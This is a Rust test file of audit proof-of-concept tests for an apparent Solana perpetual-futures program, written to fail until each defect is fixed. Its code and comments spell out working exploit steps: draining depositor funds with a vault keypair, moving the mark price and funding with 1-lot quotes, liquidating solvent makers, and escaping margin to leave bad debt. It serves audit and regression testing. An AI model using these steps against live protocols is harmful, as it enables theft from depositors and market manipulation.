// Audit A PoCs (maker fast path). Each test asserts the SAFE behaviour, so it FAILS while the defect exists.
#[path = "../../program/src/state.rs"]
#[allow(dead_code)]
mod state;
include!("common.rs");
const PX: u64 = ORACLE;
struct Mk {
    kp: Keypair,
    u: Address,
    slab: Address,
}
fn fast_new(e: &mut Env, idx: u64) -> Address {
    let k = Address::new_unique();
    e.prog_acct(k, FAST_SIZE);
    let mut d = vec![61u8];
    d.extend_from_slice(&idx.to_le_bytes());
    let (a, m) = (e.admin.pubkey(), e.market);
    e.send("", vec![AccountMeta::new(a, true), w(&m), w(&k)], d, &[], true);
    k
}
fn maker(e: &mut Env, f: &Address, dep: u64, fund: i64) -> Mk {
    let (kp, u) = e.user(dep);
    let slab = Address::new_unique();
    e.prog_acct(slab, SLAB_SIZE);
    e.send("", vec![AccountMeta::new(kp.pubkey(), true), r(&u), w(&slab)], vec![60], &[&kp], true);
    let (a, m) = (e.admin.pubkey(), e.market);
    e.send(
        "",
        vec![AccountMeta::new(a, true), r(&m), w(f), w(&slab), AccountMeta::new_readonly(kp.pubkey(), true)],
        vec![62],
        &[&kp],
        true,
    );
    let mk = Mk { kp, u, slab };
    if fund != 0 {
        fund_m(e, f, &mk, fund, true);
    }
    mk
}
fn fund_m(e: &mut Env, f: &Address, k: &Mk, amt: i64, ok: bool) {
    let mut d = vec![64u8];
    d.extend_from_slice(&amt.to_le_bytes());
    let m = e.market;
    e.send("", vec![AccountMeta::new(k.kp.pubkey(), true), w(&k.u), r(&m), w(f)], d, &[&k.kp], ok);
}
fn items(v: &[(u16, u32, u32)]) -> Vec<u8> {
    let mut d = vec![63u8];
    for (i, p, q) in v {
        d.extend_from_slice(&i.to_le_bytes());
        d.extend_from_slice(&p.to_le_bytes());
        d.extend_from_slice(&q.to_le_bytes());
    }
    d
}
fn quote(e: &mut Env, k: &Mk, v: &[(u16, u32, u32)], ok: bool) -> Option<u64> {
    e.send("", vec![AccountMeta::new(k.kp.pubkey(), true), w(&k.slab)], items(v), &[&k.kp], ok)
}
fn take_ix(side: u8, fl: u8, ns: u8, limit: u64, qty: u64) -> Vec<u8> {
    let mut d = vec![66u8, side, fl, ns];
    d.extend_from_slice(&limit.to_le_bytes());
    d.extend_from_slice(&qty.to_le_bytes());
    d
}
fn tk(
    e: &mut Env,
    kp: &Keypair,
    u: &Address,
    f: &Address,
    slabs: &[Address],
    rest: &[Address],
    side: u8,
    limit: u64,
    qty: u64,
    ok: bool,
) -> Option<u64> {
    let m = e.market;
    let mut a = vec![AccountMeta::new(kp.pubkey(), true), w(u), r(&m), w(f)];
    a.extend(slabs.iter().map(r));
    a.extend(rest.iter().map(w));
    e.send("", a, take_ix(side, 0, slabs.len() as u8, limit, qty), &[kp], ok)
}
fn fb(e: &Env, f: &Address) -> Box<FastBook> {
    let d = e.data(f);
    let mut b: Box<std::mem::MaybeUninit<FastBook>> = Box::new_uninit();
    unsafe {
        std::ptr::copy_nonoverlapping(d.as_ptr(), b.as_mut_ptr() as *mut u8, FAST_SIZE);
        b.assume_init()
    }
}
fn settle(e: &mut Env, f: &Address, k: &Mk) {
    let m = e.market;
    e.send("", vec![w(&k.u), r(&m), w(f)], vec![65], &[], true);
}
fn try_send(e: &mut Env, accounts: Vec<AccountMeta>, data: Vec<u8>, signers: &[&Keypair]) -> bool {
    let ix = Instruction { program_id: e.pid, accounts, data };
    let mut s: Vec<&Keypair> = vec![&e.admin];
    s.extend_from_slice(signers);
    let tx = Transaction::new_signed_with_payer(&[ix], Some(&e.admin.pubkey()), &s, e.svm.latest_blockhash());
    let res = e.svm.send_transaction(tx);
    e.svm.expire_blockhash();
    if let Err(f) = &res {
        println!("  tx failed: {:?}", f.err);
    }
    res.is_ok()
}
fn liq_fast_try(e: &mut Env, f: &Address, t: &Address, slabs: &[Address]) -> bool {
    let (m, ins) = (e.market, e.ins);
    let mut a = vec![w(t), r(&m), w(&ins), w(f)];
    a.extend(slabs.iter().map(r));
    let mut d = vec![70u8, slabs.len() as u8];
    d.extend_from_slice(&u64::MAX.to_le_bytes());
    try_send(e, a, d, &[])
}
const ASK: u16 = 8; // idx 0, ask ladder, level 0
const BID: u16 = 0; // idx 0, bid ladder, level 0
fn next(e: &mut Env, px: i64) {
    let s = e.slot + 1;
    e.set_time(s);
    e.oracle_update("", px, None);
}

/// CRITICAL. A maker whose position in the market is ISOLATED gets its fast fills booked into the isolated bucket at settle,
/// but slab_settle judges the maker with CROSS health only (isolated positions are skipped), so the margin stays locked and the
/// budget refills. The maker then releases the margin, withdraws it, and leaves an isolated position with negative equity
/// (bad debt for insurance / ADL). The budget also refills every settle, so the isolated position grows without any margin.
#[test]
fn poc_isolated_maker_fills_escape_margin_and_create_bad_debt() {
    // fixed: a maker's market is cross only. Isolated first -> funding as a maker is refused; maker first -> isolating is refused.
    let mut e = Env::new();
    e.oracle_update("", 1000_00000000, None);
    let f = fast_new(&mut e, 0);
    let k = maker(&mut e, &f, 1_000_000_000, 0);
    let m = e.market;
    e.send("", vec![AccountMeta::new(k.kp.pubkey(), true), w(&k.u), r(&m)], vec![30u8, 1], &[&k.kp], true);
    fund_m(&mut e, &f, &k, 1_000_000_000, false);
    e.send("", vec![AccountMeta::new(k.kp.pubkey(), true), w(&k.u), r(&m)], vec![30u8, 0], &[&k.kp], true);
    fund_m(&mut e, &f, &k, 1_000_000_000, true);
    e.send("", vec![AccountMeta::new(k.kp.pubkey(), true), w(&k.u), r(&m)], vec![30u8, 1], &[&k.kp], false);
}

/// MEDIUM. take_fast with shards: resting-order fills are counted into the taker's OI twice (take() adds the taker's long change
/// to the first shard, fast_match adds the whole take's long change to the FastBook), so Market.oi_long drifts after aggregate.
#[test]
fn poc_oi_double_counted_on_take_fast_with_shards() {
    let mut e = Env::new();
    e.oracle_update("", 1000_00000000, None);
    let f = fast_new(&mut e, 0);
    let a0 = e.shard(1, 100_000);
    let (rm, ru) = e.user(10_000_000_000);
    let m = e.market;
    let mut d = vec![1u8];
    d.extend_from_slice(&place_item(1, 1, 100_015, 50, 0, 0));
    e.send("", trade_accts(&rm, &ru, &m, &[a0]), d, &[&rm], true);
    let (tp, tu) = e.user(10_000_000_000);
    tk(&mut e, &tp, &tu, &f, &[], &[a0], 0, PX + 100, 50, true);
    assert_eq!(e.user_state(&tu).pos[0].base, 50);
    e.send("", vec![w(&m), w(&a0), w(&f)], vec![16], &[], true);
    let oi = e.market_state().oi_long;
    println!("only long in the market: taker 50 lots; Market.oi_long after aggregate = {oi}");
    assert_eq!(oi, 50, "OI counted twice");
}

/// HIGH. Liquidation ignores a maker's locked quoting margin (and unsettled fills). A maker whose real equity is above INITIAL
/// margin is liquidated (fee + forced sale into the band) by anyone who simply does not run slab_settle first.
#[test]
fn poc_liquidation_ignores_locked_maker_margin() {
    let mut e = Env::new();
    e.oracle_update("", 1000_00000000, None);
    let f = fast_new(&mut e, 0);
    let lp = maker(&mut e, &f, 100_000_000_000, 10_000_000_000); // liquidity maker
    let mm = maker(&mut e, &f, 2_000_000_000, 0); // victim: also a maker on the book
    quote(&mut e, &lp, &[(BID, 99_990, 100_000)], true);
    tk(&mut e, &mm.kp, &mm.u, &f, &[lp.slab], &[], 1, PX - 100, 100_000, true); // victim short 100k lots (cash stays >= 0)
    settle(&mut e, &f, &lp);
    fund_m(&mut e, &f, &mm, 900_000_000, true); // lock 0.9e9 as quoting margin (passes the initial-margin check)
    next(&mut e, 1050_00000000);
    next(&mut e, 1070_00000000); // +7%
    quote(&mut e, &lp, &[(ASK, 107_010, 100_000)], true);
    let u = e.user_state(&mm.u);
    let px = e.market_state().mark_px as i128;
    let eq_ex = u.cash as i128 + u.pos[0].base as i128 * px;
    let margin = fb(&e, &f).makers[1].margin as i128;
    let (im, mmr) = (-(u.pos[0].base as i128) * px / 10, -(u.pos[0].base as i128) * px / 20);
    println!(
        "victim: equity w/o margin {eq_ex}, locked margin {margin}, true equity {}, IM {im}, MM {mmr}",
        eq_ex + margin
    );
    assert!(eq_ex + margin >= im, "setup: victim is above initial margin counting its own locked margin");
    let liquidated = liq_fast_try(&mut e, &f, &mm.u, &[lp.slab, mm.slab]);
    println!(
        "liquidate_fast without settling first succeeded: {liquidated}; victim base now {}",
        e.user_state(&mm.u).pos[0].base
    );
    assert!(!liquidated, "a maker above initial margin (counting its locked margin) was liquidated");
}

/// MEDIUM. A maker blocks the empty-book ADL path forever on a book without a price signer by setting the fresh-only bits on
/// its ladder (it never quotes anything): liquidate_fast returns NoFill instead of opening the ADL window.
#[test]
fn poc_maker_blocks_adl_window_with_fresh_flag() {
    let run = |grief: bool| -> bool {
        let mut e = Env::new();
        e.oracle_update("", 1000_00000000, None);
        let f = fast_new(&mut e, 0);
        let k = maker(&mut e, &f, 10_000_000_000, 1_000_000_000);
        let (tp, tu) = e.user(1_000_000_000);
        quote(&mut e, &k, &[(ASK, 100_010, 100_000)], true);
        tk(&mut e, &tp, &tu, &f, &[k.slab], &[], 0, PX + 100, 90_000, true);
        settle(&mut e, &f, &k);
        // bid ladder (idx 0, side 0) = ladder 0: flags = fresh window 1 slot << 8; no quotes at all
        if grief {
            quote(&mut e, &k, &[(0xC000, 0, 1 << 8)], true);
        }
        next(&mut e, 910_00000000);
        let ok = liq_fast_try(&mut e, &f, &tu, &[k.slab]);
        ok && e.user_state(&tu).pos[0].flags & 2 == 2
    };
    assert!(run(false), "baseline: an empty book opens the ADL window");
    assert!(run(true), "a maker's fresh-only flag on an unsigned book keeps the ADL window shut");
}

/// HIGH (needs an approved maker). Mark and premium are taken from fast-book BBO with no size requirement. A maker posting
/// 1-lot quotes near the top of the band, and calling update_oracle with its book each slot, walks the mark up and sets the
/// premium (funding) to ~+5% (the official pusher passes no books, so its updates never pull the EMA back).
#[test]
fn poc_one_lot_quotes_move_mark_and_funding() {
    let mut e = Env::new();
    e.oracle_update("", 1000_00000000, None);
    let f = fast_new(&mut e, 0);
    let k = maker(&mut e, &f, 10_000_000_000, 1_000_000_000);
    let m0 = e.market_state();
    println!("start: oracle {} mark {}", m0.oracle_px, m0.mark_px);
    for i in 0..200u64 {
        if i % 20 == 0 {
            quote(&mut e, &k, &[(BID, 104_900, 1), (ASK, 104_950, 1)], true);
        }
        let s = e.slot + 1;
        e.set_time(s);
        let (m, o, sl) = (e.market, e.oracle, k.slab);
        e.set_pyth(1000_00000000, 1000_0000);
        e.send("", vec![w(&m), r(&o), r(&f), r(&sl)], vec![4], &[], true); // attacker's update, with its book
        e.send("", vec![w(&m), r(&o)], vec![4], &[], true); // honest pusher, same slot, no books
    }
    let m1 = e.market_state();
    println!(
        "after 200 slots (40 s mainnet): oracle {} mark {} prem_last {} ppb",
        m1.oracle_px, m1.mark_px, m1.prem_last
    );
    assert!(m1.prem_last.abs() < 10_000_000, "premium sample set to {} ppb by two 1-lot quotes", m1.prem_last);
    assert!(
        m1.mark_px.abs_diff(m1.oracle_px) * 10_000 < m1.oracle_px * 100,
        "mark moved {} bps off the oracle by 1-lot quotes",
        m1.mark_px.abs_diff(m1.oracle_px) * 10_000 / m1.oracle_px
    );
}

/// MEDIUM. slab_settle refills a maker's budget whenever equity >= maintenance, even below initial margin, so a maker keeps
/// taking on fills while under IMR (initial margin is never enforced on maker fills).
#[test]
fn poc_settle_refills_budget_below_initial_margin() {
    let mut e = Env::new();
    e.oracle_update("", 1000_00000000, None);
    let f = fast_new(&mut e, 0);
    let k = maker(&mut e, &f, 1_700_000_000, 1_000_000_000); // cash 0.7e9, margin 1e9, budget 1e10
    let (tp, tu) = e.user(5_000_000_000_000);
    quote(&mut e, &k, &[(BID, 99_990, 100_000)], true);
    tk(&mut e, &tp, &tu, &f, &[k.slab], &[], 1, PX - 100, 100_000, true);
    settle(&mut e, &f, &k);
    let u = e.user_state(&k.u);
    let px = e.market_state().mark_px as i128;
    let eq = u.cash as i128 + u.pos[0].base as i128 * px;
    let im = u.pos[0].base as i128 * px / 10;
    let b = fb(&e, &f);
    println!(
        "maker after settle: equity (w/o margin) {eq}, IM {im}, margin {}, budget {}",
        b.makers[0].margin, b.makers[0].budget
    );
    // fixed: the budget only covers what initial margin leaves free (equity incl. the locked margin, minus IM of what is held)
    let free = (eq + b.makers[0].margin as i128 - im).clamp(0, b.makers[0].margin as i128);
    assert!(
        (b.makers[0].budget as i128) <= free * 10 + 10,
        "budget {} beyond free margin {free} / IMR",
        b.makers[0].budget
    );
}

/// HIGH (key management / vault). Vault sub-accounts get `authority = vault account address`. The vault account is a plain
/// program-owned account created from a keypair (the program has no PDA path for it), so whoever holds that keypair is the
/// sub-accounts' authority: it can withdraw depositors' cash directly (no lockup, day cap, perf fee, NAV), and can also
/// slab_init / slab_fund / take_fast / set_delegate on the subs.
#[test]
fn poc_vault_keypair_drains_sub_account() {
    let mut e = Env::new();
    e.oracle_update("", 1000_00000000, None);
    let (m, tv, vp) = (e.market, e.vault, e.vault_pda);
    let vkp = Keypair::new();
    let vault = vkp.pubkey();
    e.prog_acct(vault, VAULT_SIZE);
    let a = e.admin.pubkey();
    let mut d = vec![50u8];
    for v in [1_000_000u64, 0, 0, 0] {
        d.extend_from_slice(&v.to_le_bytes());
    }
    e.send("", vec![AccountMeta::new(a, true), w(&vault), r(&m)], d, &[], true);
    let sub = Address::new_unique();
    e.prog_acct(sub, USER_SIZE);
    e.send("", vec![AccountMeta::new(a, true), w(&vault), w(&sub)], vec![51], &[], true);
    // a depositor puts 5e9 in with a long lockup
    let dep = Keypair::new();
    e.svm.airdrop(&dep.pubkey(), 1_000_000_000).unwrap();
    let mint = Address::from(e.market_state().mint);
    let src = Address::new_unique();
    e.svm
        .set_account(
            src,
            Account {
                lamports: 1_000_000_000,
                data: token_acct(&mint, &dep.pubkey(), 5_000_000_000),
                owner: TOKEN,
                executable: false,
                rent_epoch: 0,
            },
        )
        .unwrap();
    let rec = Address::new_unique();
    e.prog_acct(rec, VDEP_SIZE);
    let mut d = vec![53u8];
    d.extend_from_slice(&5_000_000_000u64.to_le_bytes());
    e.send(
        "",
        vec![AccountMeta::new(dep.pubkey(), true), w(&vault), w(&rec), w(&sub), r(&m), w(&tv), w(&src), r(&TOKEN)],
        d,
        &[&dep],
        true,
    );
    assert_eq!(e.user_state(&sub).cash, 5_000_000_000);
    // the vault account's keypair signs a plain withdraw on the sub-account
    let dst = Address::new_unique();
    e.svm
        .set_account(
            dst,
            Account {
                lamports: 1_000_000_000,
                data: token_acct(&mint, &vault, 0),
                owner: TOKEN,
                executable: false,
                rent_epoch: 0,
            },
        )
        .unwrap();
    let mut d = vec![14u8];
    d.extend_from_slice(&5_000_000_000u64.to_le_bytes());
    let drained = try_send(
        &mut e,
        vec![AccountMeta::new(vault, true), w(&sub), r(&m), w(&tv), w(&dst), r(&TOKEN), r(&vp)],
        d,
        &[&vkp],
    );
    println!(
        "vault keypair withdrew depositor funds from the sub-account: {drained}; sub cash now {}",
        e.user_state(&sub).cash
    );
    assert!(!drained, "vault account keypair is an unrestricted authority over depositor funds");
}
